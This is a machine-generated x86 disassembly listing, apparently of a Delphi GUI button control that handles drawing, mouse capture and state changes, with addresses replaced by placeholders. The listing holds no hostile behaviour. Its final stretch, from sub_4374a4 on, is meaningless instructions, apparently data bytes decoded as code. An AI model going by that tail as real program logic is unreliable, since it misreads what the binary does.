sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_4365e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4362b8
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_436074
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4361d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_436654
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447cc8
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_436678
push ebx
mov ebx eax
mov eax ebx
call sub_455934
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4366c4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4366f4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_436fa4
sub_436714
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_437030
sub_436734
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_435898
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_436f64
mov ecx esi
xor edx edx
mov eax ebx
call sub_450a00
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_4490d8
mov edx 0xff00000f
mov eax ebx
call sub_44914c
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4367f4
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450a5c
mov eax [ esi + 0x16c ]
call sub_403128
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_43682c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_436c56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_42517c
call sub_43c760
call sub_43c840
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_4170c4
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_425280
mov edx eax
mov eax esi
call sub_4460d4
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425280
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425280
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_43c760
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_43cb64
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_425280
push eax
call sub_43c760
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43c94c
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425280
push eax
call sub_43c760
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43c8b0
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_43c760
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_43caa4
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_425280
push eax
call sub_43c760
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43c94c
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425280
push eax
call sub_43c760
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43c8b0
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_424a38
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_424e6c
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_417088
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_448fac
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_44b2c4
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_4365e4
mov edx 0xff000014
mov eax 0xff00000f
call sub_42b858
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a0c
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_424e6c
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436c5d
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403edc
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_417088
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_42426c
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_448fac
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_44b2c4
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_4365e4
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_436c64
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_447830
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_44a198
jmp r-xdata
sub_436cc8
push ebx
mov ebx eax
mov eax ebx
call sub_44b0a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_435a9c
pop ebx
retn
sub_436cf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44a5ac
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436d4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44a864
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_436c64
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_4489b0
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_4489f4
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_436dec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44a90c
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4489b0
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_4489f4
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_436fa4
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_436c64
mov eax ebx
mov si 0xffeb
call sub_403324
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_436f38
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_435a74
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436f6c
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_44c528
sub_436fa4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_436f6c
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_43709c
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43710c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_435a9c
mov eax ebx
call sub_436c64
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_437140
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_455c28
sub_4371b0
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_437239
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_448fac
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_460768
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403324
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437240
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_43727c
push ebx
push esi
mov esi eax
mov eax esi
call sub_44ad10
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_43c760
call sub_43c840
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_4372f0
push ebx
push esi
mov esi eax
mov eax esi
call sub_44ad28
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_43c760
call sub_43c840
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_437358
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_436f08
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_4299e0
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_424a38
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4170c4
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4299e0
pop edx
call sub_424e6c
push 0x0
push edi
push 0x1
mov eax ebx
call sub_4299e0
mov edx eax
xor ecx ecx
mov eax esi
call sub_457158
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4373e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44aeb8
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_437030
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_436f08
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_456c40
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_437358
pop ecx
sub_4374a4
or al [ eax ]
add [ eax ] al
enter 0x48ba 0x0
xor al 0xc2
dec eax
add [ eax ] al
add [ eax ] al
add ah al
mov edx 0xc0ec0048
dec eax
add [ eax ] al
add [ eax ] al
add al al
mov edx 0xc08c0048
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + edi * 4 - 0x3e7fffb8 ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x640048ba ] bh
retn 0x48
sub_4374e0
add [ eax ] al
add [ eax ] al
mov ah 0xba
dec eax
add [ esp + eax * 8 + 0x48 ] ah
add [ eax ] al
mov al 0xba
dec eax
add [ eax + 0x48c2 ] bl
add [ eax ] al
add [ edx + edi * 4 - 0x3cd7ffb8 ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x7fffb746 ] ch
les ecx [ eax ]
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
mov edx 0xc0b00048
dec eax
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43754c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437553
retn
call sub_437488
sub_437583
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 ] dl
inc ebx
add [ esi + esi * 2 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
jbe r-xdata
inc edx
add [ eax - 0x2bffbdee ] dl
add [ edx ] bh
jbe r-xdata
inc eax
add [ esi + esi * 2 + 0x43 ] dl
add [ edi ] al
adc dl [ edi + ecx * 2 + 0x70 ]
outsb
add [ eax + ecx ] bl
inc ebx
add [ eax ] bl
jg r-xdata
adc al 0x42
inc edx
add ah dl
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x4004378 ] cl
add [ ebx ] eax
mov al 0xfd
inc edx
add [ eax - 0x1bffbd02 ] ch
jle r-xdata
add al dl
add [ eax ] al
add [ eax ] ah
stc
inc edx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add al bl
std
inc edx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + eax - 0x7207ffbd ] ah
inc ecx
add ah al
add al [ ebx ]
adc al 0x8d
inc ecx
add [ eax + 0x54004211 ] cl
adc [ edx ] al
cwde
adc [ edx ] eax
nop
adc al [ edx ]
aam 0x14
inc edx
inc ebp
inc esp
insb
jae r-xdata
push esp
dec edi
jo r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xcc0040 ] dl
add [ eax ] al
add eax [ eax ]
out dx eax
in al dx
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
add [ ecx ] dl
push esp
push ebx
imul ebp [ ebp + 0x6e ] 0x69615074
outsb
je r-xdata
xchg esp eax
adc [ eax ] al
pushad
add [ eax ] al
jmp [ eax ]
add [ eax + edx + 0x600040 ] dl
add bh bh
pushad
add [ eax ] al
call esp
add [ ebx ] 0x80000000
add [ eax ] al
add [ eax + 0x46060008 ] al
imul ebp [ esp + esi * 2 + 0x65 ] r-xdata
in al dx
jbe r-xdata
add al al
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x75cc676f
inc ebx
add [ eax ] dl
cli
inc edx
add [ ebx ] dl
add [ edi ] al
inc ebp
js r-xdata
outsb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
and [ ebx ] dh
rcl [ ebp + 0x68 ] 0x3f
js r-xdata
popad
outsb
insb
mov eax eax
fdiv [ edi + 0x43 ]
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] edx
insb
outsb
je r-xdata
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
inc eax
add ah bl
adc al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
ja r-xdata
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ edx + edi - 0x1fbffbd ] al
inc esp
add al bl
inc eax
inc ebx
add [ edx + eax + 0x45 ] ch
add al cl
add [ eax + eax - 0x80 ] 0xf8
inc esp
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x3f440044 ] ch
inc ebx
add al bl
mov esi 0xcc780044
inc esp
add [ eax + 0x3b ] cl
inc ebx
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0x4004515
inc ecx
inc ebx
add [ eax - 0xc ] ch
inc esp
add [ eax - 0x9 ] bl
inc esp
add [ eax ] dh
cmp eax 0x10043
sldt [ eax ]
js r-xdata
inc esp
add ah dl
adc al 0x42
add [ eax ] ch
add al [ eax ]
add ah cl
and [ ebx ] al
mov esp 0x7c004214
xor eax [ eax ]
cld
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
push r-xdata
